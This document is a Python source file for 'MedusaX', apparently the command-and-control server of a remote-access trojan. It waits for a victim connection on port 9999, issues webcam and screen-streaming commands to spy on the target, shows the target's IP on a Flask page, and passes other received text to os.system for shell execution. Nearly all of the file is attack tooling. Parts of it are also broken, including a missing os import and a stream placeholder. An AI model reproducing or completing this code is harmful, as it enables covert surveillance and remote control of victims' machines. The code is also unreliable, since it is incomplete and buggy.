import socket
import threading
import time
from flask import Flask, render_template_string
from colorama import Fore, init

# Initialize colorama for colored output
init(autoreset=True)

# Global Variables
streaming_html_location = "streaming_page.html"  # Placeholder for where the HTML page will be stored
streaming_active = False
server_socket = None
client_socket = None

# Flask application for displaying the live stream
app = Flask(__name__)

@app.route('/')
def home():
    # Load HTML template for stream
    return render_template_string(open(streaming_html_location).read())

# Function to handle streaming
def start_streaming(stream_type):
    global streaming_active
    if streaming_active:
        print(Fore.RED + "[!] Streaming is already active!")
        return
    
    print(Fore.GREEN + "[*] Starting...")
    time.sleep(2)
    print(Fore.GREEN + "[*] Preparing player...")
    time.sleep(2)
    print(Fore.GREEN + f"[*] Opening player at: http://127.0.0.1:5000/")

    # Create the HTML page template for live streaming
    html_content = f"""
    <html>
    <head><title>MedusaX {stream_type.capitalize()} Stream</title></head>
    <body>
        <h1>MedusaX {stream_type.capitalize()} Stream</h1>
        <p>Target IP: {client_socket.getpeername()[0]}</p>
        <p>Start Time: {time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime())}</p>
        <p>Status: {"Playing" if streaming_active else "Stopped"}</p>
        <!-- Insert webcam/screen stream here -->
        <video controls autoplay>
            <source src="stream_source" type="video/mp4">
            Your browser does not support the video tag.
        </video>
    </body>
    </html>
    """
    
    with open(streaming_html_location, "w") as f:
        f.write(html_content)
    
    streaming_active = True
    print(Fore.GREEN + "[*] Streaming...")

    # Start the Flask server to serve the stream
    app.run(debug=False, use_reloader=False, port=5000)

def handle_client_connection(client):
    global client_socket
    client_socket = client

    # Wait for commands from the client
    while True:
        command = client.recv(1024).decode('utf-8')
        
        if command.startswith('!webcam_stream') or command.startswith('!screen_stream'):
            stream_type = 'webcam' if 'webcam' in command else 'screen'
            start_streaming(stream_type)
        elif command.startswith('CTRL+P'):
            print(Fore.YELLOW + "[*] Stopping stream...")
            streaming_active = False
            break
        elif command.startswith("!"):
            print(Fore.RED + "[!] Unknown command.")
        else:
            os.system(command)  # Execute shell command if not a valid MedusaX command

# Listening for incoming connections
def server_listener():
    global server_socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("0.0.0.0", 9999))  # Bind to any address and port 9999
    server_socket.listen(1)
    print(Fore.GREEN + "MedusaX Server is ready to accept connections.")
    
    client, address = server_socket.accept()
    print(Fore.GREEN + f"[*] Client connected: {address}")
    handle_client_connection(client)

# Function to handle the CLI input prompt
def command_prompt():
    while True:
        # Display the MedusaX command prompt
        command = input("medusax > ")

        if command.startswith('!webcam_stream') or command.startswith('!screen_stream'):
            # Send the appropriate command to the client
            client_socket.sendall(command.encode())
        elif command.startswith("CTRL+P"):
            print(Fore.YELLOW + "[*] Stopping stream...")
            streaming_active = False
            break
        elif command == 'exit':
            print("[*] Exiting server.")
            server_socket.close()
            break
        else:
            print(Fore.RED + "[!] Unknown command.")

# Start the server listener and CLI prompt in separate threads
if __name__ == "__main__":
    listener_thread = threading.Thread(target=server_listener)
    listener_thread.start()

    # Run the command prompt for server interaction
    command_prompt()
